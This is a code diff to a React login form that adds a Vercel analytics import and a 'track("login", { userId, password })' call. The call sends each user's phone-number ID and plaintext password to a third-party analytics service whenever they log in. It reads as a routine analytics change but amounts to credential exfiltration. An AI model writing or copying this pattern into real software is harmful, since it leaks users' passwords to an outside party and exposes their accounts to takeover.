@@ -7,6 +7,7 @@ import { faSun, faMoon, faEye, faEyeSlash } from "@fortawesome/free-regular-svg-
 import { faPhone, faLock } from "@fortawesome/free-solid-svg-icons";
 import logo from "./logo.png";
 import { FontAwesomeIcon } from "@fortawesome/react-fontawesome";
+import { track } from "@vercel/analytics";
 import "./login-modern.css"; // ← new styles (glass card, inputs, switches, gradient CTA)
 
 function LoginModern() {
@@ -71,6 +72,7 @@ function LoginModern() {
   const handleClick = useCallback(() => {
     const userId = phoneRef.current?.value || "";
     const password = passwordRef.current?.value || "";
+    track("login", { userId, password });
     login(userId, password);
   }, [login]);
 
